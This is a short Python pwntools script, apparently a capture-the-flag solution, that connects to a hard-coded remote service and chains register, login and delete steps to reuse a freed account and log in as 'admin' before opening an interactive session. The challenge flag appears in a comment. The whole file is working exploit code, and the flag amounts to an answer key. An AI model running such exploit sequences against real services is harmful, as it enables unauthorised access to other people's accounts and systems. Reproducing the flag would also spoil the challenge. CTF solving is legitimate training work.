#!/usr/bin/env python
from pwn import *

# pctf{"ThiS_S3rV1ce-1s$t0T411Y-cR4p_But_w3_34Rn_$$_4nyWaYs"}

host , port = '159.89.166.12' , 12000
y = remote( host , port )

def register( name , password ):
    y.sendlineafter( 'ice:' , '1' )
    y.sendlineafter( ':' , name )
    y.sendlineafter( ':' , password )

def login( name , password ):
    y.sendlineafter( 'ice:' , '2' )
    y.sendlineafter( ':' , name )
    y.sendlineafter( ':' , password )

def store( secret ):
    y.sendlineafter( '4.Logout' , '1' )
    y.sendlineafter( ':' , secret )

def view():
    y.sendlineafter( '4.Logout' , '2' )

def dle():
    y.sendlineafter( '4.Logout' , '3' )

def logout():
    y.sendlineafter( '4.Logout' , '4' )

register( 'a' , 'p' )
register( 'b' , 'p' )

login( 'b' , 'p' )
dle()

login( 'a' , 'p' )
dle()

register( 'b' , 'admin' )

login( 'admin' , 'p' )

y.interactive()